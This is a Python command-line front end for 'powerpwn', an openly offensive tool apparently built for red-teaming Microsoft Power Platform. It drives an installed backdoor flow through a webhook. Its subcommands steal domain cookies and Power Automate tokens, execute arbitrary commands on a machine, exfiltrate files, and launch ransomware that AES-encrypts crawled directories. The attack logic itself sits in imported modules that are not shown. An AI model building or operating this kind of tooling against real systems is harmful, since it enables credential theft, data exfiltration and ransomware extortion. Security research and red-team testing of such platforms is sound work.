import argparse
import json
import logging

from art import tprint

from powerpwn.const import LOGGER_NAME
from powerpwn.machinepwn.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.machinepwn.enums.command_to_run_enum import CommandToRunEnum
from powerpwn.machinepwn.machine_pwn import MachinePwn
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.enums.action_type import ActionType

logger = logging.getLogger(LOGGER_NAME)

def register_machine_pwn_common_args(sub_parser: argparse.ArgumentParser):
    sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")


def register_backdoor_flow_common_args(sub_parser: argparse.ArgumentParser):
    sub_parser.add_argument("-w", "--webhook-url", required=True, type=str, help="Webhook url to the flow factory installed in powerplatform")
    sub_parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    sub_parser.add_argument("-e", "--environment-id", required=True, type=str, help="Environment id in powerplatform.")


def register_exec_parsers(command_subparsers: argparse.ArgumentParser):
    steal_fqdn_parser = command_subparsers.add_parser("steal-cookie", description="Steal cookie of fqdn")
    register_steal_fqdn_cookie_parser(steal_fqdn_parser)

    steal_power_automate_token_parser = command_subparsers.add_parser("steal-power-automate-token", description="Steal power automate token")
    register_machine_pwn_common_args(steal_power_automate_token_parser)

    execute_command_parser = command_subparsers.add_parser("command-exec", description="Execute command on machine")
    register_exec_command_parser(execute_command_parser)

    ransomware_parser = command_subparsers.add_parser("ransomware", description="Ransomware")
    register_ransomware_parser(ransomware_parser)

    exflirtate_file_parser = command_subparsers.add_parser("exflirtate", description="Exflirtate file")
    register_exflirtate_file_parser(exflirtate_file_parser)

    cleanup_parser = command_subparsers.add_parser("cleanup", description="Cleanup")
    register_machine_pwn_common_args(cleanup_parser)


## machine pwn parsers ##
def register_steal_fqdn_cookie_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-fqdn", "--cookie", required=True, type=str, help="Fully qualified domain name to fetch the cookies of")


def register_exec_command_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-t", "--type", required=True, type=str, choices=[cmd_type.value for cmd_type in CodeExecTypeEnum], help="Command type")
    sub_parser.add_argument("-c", "--command-to-execute", required=True, type=str, help="Command to execute")


def register_ransomware_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("--crawl_depth", required=True, type=str, help="Recursively search into subdirectories this many times")
    sub_parser.add_argument("-k", "--encryption-key", required=True, type=str, help="an encryption key used to encrypt each file identified (AES256)")
    sub_parser.add_argument(
        "--dirs", required=True, type=str, help="A list of directories to begin crawl from separated by a command (e.g.'C:\\,D:\\')"
    )


def register_exflirtate_file_parser(sub_parser: argparse.ArgumentParser):
    register_machine_pwn_common_args(sub_parser)
    sub_parser.add_argument("-f", "--file", required=True, type=str, help="Absolute path to file")


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--log-level", default=logging.INFO, type=lambda x: getattr(logging, x), help="Configure the logging level.")
    command_subparsers = parser.add_subparsers(help="command", dest="command")

    ## Delete Flow parser ##
    delete_flow_parser = command_subparsers.add_parser("delete-flow", description="Deletes flow.", help="Deletes flow using installed backdoor flow.")
    register_backdoor_flow_common_args(delete_flow_parser)
    delete_flow_parser.add_argument("-f", "--flow-id", type=str, help="Flow id to delete.")

    ## Create Flow parser ##
    create_flow_parser = command_subparsers.add_parser(
        "create-flow", description="Creates a flow.", help="Creates a flow using installed backdoor flow."
    )
    register_backdoor_flow_common_args(create_flow_parser)
    create_flow_parser.add_argument("-i", "--input", type=str, required=True, help="Path to flow details input file.")

    ## Get connections parser ##
    get_connections_parser = command_subparsers.add_parser(
        "get-connections", description="Get connections", help="Gets connections details in environment"
    )
    register_backdoor_flow_common_args(get_connections_parser)
    get_connections_parser.add_argument("-o", "--output", type=str, default="", help="Path to output file.")

    register_exec_parsers(command_subparsers)
    args = parser.parse_args()

    return args


def run_backdoor_flow_command(args):
    action_type = ActionType(args.command)
    backdoor_flow = BackdoorFlow(args.webhook_url)
    if action_type == ActionType.delete_flow:
        backdoor_flow.delete_flow(args.environment_id, args.flow_id)

    elif action_type == ActionType.create_flow:
        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)

    elif action_type == ActionType.get_connections:
        output_to_file = args.output and args.output != ""
        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
        if output_to_file:
            f = open(args.output, "w+")
            f.write(json.dumps(connections, indent=4))
        else:
            logger.info(connections)


def run_machine_pwn_command(args):
    command_type = CommandToRunEnum(args.command)
    machine_pwn = MachinePwn(args.webhook_url)
    if command_type == CommandToRunEnum.CLEANUP:
        res = machine_pwn.cleanup()
    elif command_type == CommandToRunEnum.CODE_EXEC:
        res = machine_pwn.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
    elif command_type == CommandToRunEnum.EXFILTRATION:
        res = machine_pwn.exfiltrate(args.file)
    elif command_type == CommandToRunEnum.RANSOMWARE:
        res = machine_pwn.ransomware(args.crawl_depth, args.dirs, args.encryption_key)
    elif command_type == CommandToRunEnum.STEAL_COOKIE:
        res = machine_pwn.steal_cookie(args.cookie)
    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
        res = machine_pwn.steal_power_automate_token()
    print(res)


def main():
    print("\n\n------------------------------------------------------------")
    tprint("powerpwn")
    print("------------------------------------------------------------\n\n")

    args = parse_arguments()

    logging.basicConfig(level=args.log_level)
    logger.level = args.log_level
    command = args.command

    if command in [action_type.value for action_type in ActionType]:
        run_backdoor_flow_command(args)

    elif command in [cmd_type.value for cmd_type in CommandToRunEnum]:
        run_machine_pwn_command(args)

    else:
        logger.warning("Run `powerpwn --help` for available commands.")


if __name__ == "__main__":
    main()
